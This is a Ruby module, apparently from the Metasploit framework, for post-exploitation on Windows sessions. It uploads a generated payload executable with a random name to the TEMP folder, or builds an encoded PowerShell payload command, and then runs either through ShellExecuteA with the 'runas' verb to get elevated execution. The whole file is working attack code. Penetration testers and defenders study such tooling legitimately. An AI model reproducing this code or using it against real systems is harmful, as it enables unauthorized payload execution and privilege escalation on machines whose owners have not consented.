# -*- coding: binary -*-

require 'msf/core/exploit/powershell'
require 'msf/core/exploit/exe'

module Msf::Post::Windows::Runas
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::Powershell

  def execute_exe(filename = nil, path = nil, upload = nil)
    payload_filename = filename || Rex::Text.rand_text_alpha((rand(8) + 6)) + '.exe'
    payload_path = path || get_env('TEMP')
    cmd_location = "#{payload_path}\\#{payload_filename}"

    if upload
      exe_payload = generate_payload_exe
      print_status("Uploading #{payload_filename} - #{exe_payload.length} bytes to the filesystem...")
      write_file(cmd_location, exe_payload)
    else
      print_status("No file uploaded, attempting to execute #{cmd_location}...")
    end

    shell_exec(cmd_location, nil)
  end

  def execute_psh
    powershell_command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)
    command = 'cmd.exe'
    args = "/c #{powershell_command}"
    shell_exec(command, args)
  end

  def shell_exec(command, args)
    print_status('Executing elevated command...')
    session.railgun.shell32.ShellExecuteA(nil, 'runas', command, args, nil, 'SW_SHOW')
  end
end
